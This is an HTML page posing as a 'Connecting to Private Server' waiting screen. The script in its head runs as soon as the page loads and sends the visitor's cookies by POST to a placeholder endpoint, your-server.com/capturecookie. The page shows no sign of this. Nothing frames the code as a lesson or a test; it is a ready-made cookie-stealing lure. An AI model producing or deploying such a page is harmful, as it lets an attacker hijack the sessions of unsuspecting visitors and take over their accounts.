<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting to Server</title>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            fetch('https://your-server.com/capturecookie', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    cookie: document.cookie
                })
            });
        });
    </script>
</head>
<body>
    <h1>Connecting to Private Server...</h1>
    <p>Please wait while we connect you to the private server.</p>
</body>
</html>
